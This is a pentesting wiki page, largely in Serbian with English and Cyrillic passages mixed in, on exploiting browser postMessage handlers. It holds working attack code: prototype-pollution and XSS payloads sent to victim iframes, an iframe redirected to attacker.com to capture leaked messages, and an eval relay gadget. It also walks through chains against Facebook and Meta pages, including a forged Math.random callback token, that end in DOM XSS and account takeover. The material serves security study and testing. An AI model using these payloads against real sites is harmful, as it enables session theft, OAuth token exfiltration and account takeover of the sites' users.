# PostMessage ranjivosti

{{#include ../../banners/hacktricks-training.md}}

## Slanje **PostMessage**

**PostMessage** koristi sledeću funkciju za slanje poruke:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
U **drugom scenariju**, **poruka može biti poslata samo tom domenu** (čak i ako je origin of the window object različit).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Napad na iframe & wildcard u **targetOrigin**

Kao што је објашњено у [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), ако пронађете страницу која може бити **iframed** (без `X-Frame-Header` заштите) и која путем **postMessage** шаље **osetljive** поруке користећи **wildcard** (\*), можете **izmeniti** **origin** **iframe**-а и **leak** **osetljive** поруке на домен који контролишете.\
Имајте на уму да ако се страница може iframovati, али је **targetOrigin** **podešen na URL umesto na wildcard**, овај **trik neće raditi**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener eksploatacija

**`addEventListener`** je funkcija koju JS koristi da deklariše funkciju koja **očekuje `postMessages`**.\
Koristiće se kod sličan sledećem:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Pretražite** JS kod za `window.addEventListener` i `$(window).on` (_JQuery verzija_)
- **Pokrenite** u konzoli alata za programere: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Idite na** _Elements --> Event Listeners_ u developer tools u browseru

![](<../../images/image (396).png>)

- Koristite **browser extension** kao što je [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ili [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ove ekstenzije će **presretati sve poruke** i prikazati ih.

### Origin check bypasses

- **`event.isTrusted`** atribut se smatra sigurnim jer vraća `True` samo za događaje koji su generisani pravim korisničkim akcijama. Iako je teško zaobići ako je pravilno implementiran, njegova važnost u sigurnosnim proverama je značajna.
- Korišćenje **`indexOf()`** za validaciju origin-a kod PostMessage događaja može biti podložno zaobilaženju. Primer koji ilustruje ovu ranjivost je:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- **`search()`** metoda iz `String.prototype.search()` je namenjena regularnim izrazima, ne običnim stringovima. Prosleđivanje ne-regex vrednosti vodi implicitnoj konverziji u regex, što može učiniti metodu nesigurnom. U regex-u, tačka (.) funkcioniše kao wildcard, omogućavajući zaobilaženje validacije sa posebno izrađenim domenima. Na primer:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** funkcija, slično `search()`, radi sa regex-ovima. Ako je regex nepravilno strukturisan, može biti podložan zaobilaženju.
- **`escapeHtml`** funkcija ima za cilj sanitizaciju unosa bekapevanjem karaktera. Međutim, ona ne kreira novi escaped objekat već prepisuje svojstva postojeće instance. Ovo ponašanje može biti iskorišćeno. Konkretno, ako se objekat može manipulisati tako da njegovo kontrolisano svojstvo ne prepoznaje `hasOwnProperty`, `escapeHtml` neće raditi kako se očekuje. Ovo je demonstrirano u primerima ispod:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

U kontekstu ove ranjivosti, `File` object je naročito iskorišćen zbog svog read-only `name` svojstva. Ovo svojstvo, kada se koristi u templatu, nije sanitizovano od strane `escapeHtml` funkcije, što vodi do potencijalnih sigurnosnih rizika.

- `document.domain` property u JavaScript-u može biti podešen od strane skripta da skrate domen, omogućavajući relaksiraniju primenu same-origin politike unutar istog parent domena.

### Origin-only trust + trusted relays

Ako receiver proverava samo **`event.origin`** (npr. veruje bilo kom `*.trusted.com`) često možete naći **"relay" stranicu na tom origin-u koja echo-uje attacker-controlled parametre preko `postMessage`** ka prosleđenom `targetOrigin`/`targetWindow`. Primeri uključuju marketing/analytics gadgete koji uzimaju query parametre i prosleđuju `{msg_type, access_token, ...}` ka `opener`/`parent`. Možete:

- **Otvoriti victim stranicu u popup/iframe koji ima `opener`** tako da se registruju njeni handler-i (mnogi pixels/SDKs pričvršćuju listener-e samo kada `window.opener` postoji).
- **Navigirati drugi attacker prozor ka relay endpoint-u na trusted origin-u**, popunjavajući polja poruke koja želite inject-ovati (message type, tokens, nonces).
- Pošto poruka sada dolazi **sa trusted origin-a**, provera samo po origin-u prolazi i možete pokrenuti privilegovana ponašanja (promene stanja, API pozive, pisanja u DOM) u victim listener-u.

Abuse patterns viđeni u prirodi:

- Analytics SDKs (npr. pixel/fbevents-style) konzumiraju poruke kao `FACEBOOK_IWL_BOOTSTRAP`, zatim **pozivaju backend API-je koristeći token dostavljen u poruci** i uključuju **`location.href` / `document.referrer`** u telu zahteva. Ako obezbedite sopstveni token, možete **pročitati ove zahteve u istoriji/zapisima zahteva tog tokena** i exfil **OAuth codes/tokens** prisutne u URL/referrer-u victim stranice.
- Bilo koji relay koji reflektuje proizvoljna polja u `postMessage` vam dozvoljava da **spoof-ujete tipove poruka** koje očekuju privilegovani listener-i. Kombinujte sa slabom validacijom input-a da biste dosegli Graph/REST pozive, otključavanje funkcionalnosti ili tokove ekvivalentne CSRF-u.

Hunting tips: enumerišite `postMessage` listener-e koji proveravaju samo `event.origin`, zatim tražite **same-origin HTML/JS endpoint-e koji prosleđuju URL parametre preko `postMessage`** (marketing previews, login popups, OAuth error pages). Povežite oba sa `window.open()` + `postMessage` da zaobiđete provere origin-a.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Moguće je proveriti da li je poruka došla iz istog prozora u kojem skripta sluša (posebno zanimljivo za **Content Scripts from browser extensions** da provere da li je poruka poslata sa iste stranice):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Možete primorati da **`e.source`** poruke bude null kreiranjem **iframe**-a koji **šalje** **postMessage** i koji se **odmah ukloni**.

Za više informacija **pročitajte:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Da biste izveli ove napade, idealno biste mogli **staviti veb stranicu žrtve** unutar `iframe`. Ali neka zaglavlja poput `X-Frame-Header` mogu **sprečiti** to **ponašanje**.\
U takvim scenarijima i dalje možete koristiti manje prikriven napad. Možete otvoriti novu karticu prema ranjivoj web aplikaciji i komunicirati sa njom:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Krađa poruke poslate podređenom iframe-u blokiranjem glavne stranice

U sledećoj stranici možete videti kako možete ukrasti **osetljive postmessage podatke** poslati **podređenom iframe-u** tako što ćete **blokirati** **glavnu** stranicu pre slanja podataka i zloupotrebiti **XSS u podređenom** da **leak** podatke pre nego što budu primljeni:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Krađa poruke menjajući lokaciju iframe-a

Ako možete ugraditi web stranicu kao iframe bez X-Frame-Header-a koja sadrži drugi iframe, možete **promeniti lokaciju tog podređenog iframe-a**, pa ako prima **postmessage** poslat korišćenjem **wildcard-a**, napadač bi mogao **promeniti** taj iframe **origin** na stranicu koju **kontroliše** i **ukrasti** poruku:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage ka Prototype Pollution i/ili XSS

U scenarijima gde se podaci poslati preko `postMessage` izvršavaju pomoću JS-a, možete **iframe** **stranicu** i **iskoristiti** **prototype pollution/XSS** slanjem exploita putem `postMessage`.

Par **veoma dobro objašnjenih XSS-ova kroz `postMessage`** možete naći na [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Primer exploita koji zloupotrebljava **Prototype Pollution a zatim XSS** putem `postMessage` ka `iframe`-u:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Za **više informacija**:

- Link ka stranici o [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link ka stranici o [**XSS**](../xss-cross-site-scripting/index.html)
- Link ka stranici o [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Učitavanje skripti izvedeno iz origin-a i supply-chain pivot (CAPIG case study)

`capig-events.js` je registrovao samo `message` handler kada je postojao `window.opener`. Na `IWL_BOOTSTRAP` je proverio `pixel_id`, ali je sačuvao `event.origin` i kasnije ga koristio da izgradi `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Handler koji upisuje origin pod kontrolom napadača</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Get an opener: npr., u Facebook Android WebView ponovo upotrebite `window.name` sa `window.open(target, name)` tako da prozor postane njegov vlastiti opener, zatim pošaljite poruku iz malicioznog iframe-a.
2. Send `IWL_BOOTSTRAP` from any origin da biste sačuvali `host = event.origin` u `localStorage`.
3. Host `/sdk/<pixel_id>/iwl.js` na bilo kojem CSP-allowed origin (takeover/XSS/upload na whitelisted analytics domenu). `startIWL()` zatim učitava attacker JS u embedding site (npr. `www.meta.com`), omogućavajući credentialed cross-origin pozive i account takeover.

Ako direktna kontrola opener-a nije bila moguća, kompromitovanje third-party iframe-a na stranici je i dalje dozvoljavalo slanje konstruisanog `postMessage` roditelju kako bi se zatrovao sačuvani host i prisililo učitavanje skripte.

**Backend-generated shared script → stored XSS:** plugin `AHPixelIWLParametersPlugin` konkatenirao je user rule parametre u JS koji se dodaje `capig-events.js` (npr. `cbq.config.set(...)`). Injektovanjem breakouts poput `"]}` ubacivan je proizvoljan JS, stvarajući stored XSS u deljenoj skripti koja se servira svim sajtovima koji je učitavaju.

### Trusted-origin allowlist isn't a boundary

Stroga provera `event.origin` radi samo ako **trusted origin ne može da izvrši attacker JS**. Kada privilegovane stranice ugrađuju third-party iframe-ove i pretpostave da je `event.origin === "https://partner.com"` bezbedan, bilo koji XSS u `partner.com` postaje most u parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Uočen obrazac napada u divljem okruženju:

1. **Exploit XSS in the partner iframe** i drop a relay gadget tako da bilo koji `postMessage` postane code exec unutar trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Sa napadačeve stranice**, pošaljite JS u kompromitovani iframe koji prosleđuje dozvoljeni tip poruke nazad roditeljskom prozoru. Poruka potiče od `partner.com`, prolazi kroz allowlist, i nosi HTML koji se nesigurno ubacuje:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. The parent injects the attacker HTML, giving **JS execution in the parent origin** (e.g., `facebook.com`), which can then be used to steal OAuth codes or pivot to full account takeover flows.

Key takeaways:

- **Partner origin isn't a boundary**: any XSS in a "trusted" partner lets attackers send allowed messages that bypass `event.origin` checks.
- Handlers that **render partner-controlled payloads** (e.g., `innerHTML` on specific message types) make partner compromise a same-origin DOM XSS.
- A wide **message surface** (many types, no structure validation) gives more gadgets for pivoting once a partner iframe is compromised.

### Predviđanje **`Math.random()`** callback tokena u postMessage bridges

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- **Force more outputs without reloads:** Some SDKs expose a reinit path; in the FB SDK, firing `init:post` with `{xfbml:1}` forces `XFBML.parse()`, destroys/recreates the plugin iframe, and generates new names/callback IDs. Repeated reinit produces as many PRNG outputs as needed (note extra internal `Math.random()` calls for callback/iframe IDs, so solvers must skip intervening values).
- **Trusted-origin delivery via parameter pollution:** If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.
- **Trigger the sink:** Craft the postMessage data so the bridge dispatches `xd.mpn.setupIconIframe` and injects HTML in `iconSVG` (e.g., URL-encoded `<img src=x onerror=...>`), achieving DOM XSS inside the hosting origin; from there, same-origin iframes (OAuth dialogs, arbiters, etc.) can be read.
- **Framing quirks help:** The chain requires framing. In some mobile webviews, `X-Frame-Options` may degrade to unsupported `ALLOW-FROM` when `frame-ancestors` is present, and “compat” parameters can force permissive `frame-ancestors`, enabling the `window.name` side channel.

#### Minimalni primer falsifikovane poruke
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Izvori

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Za vežbu: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
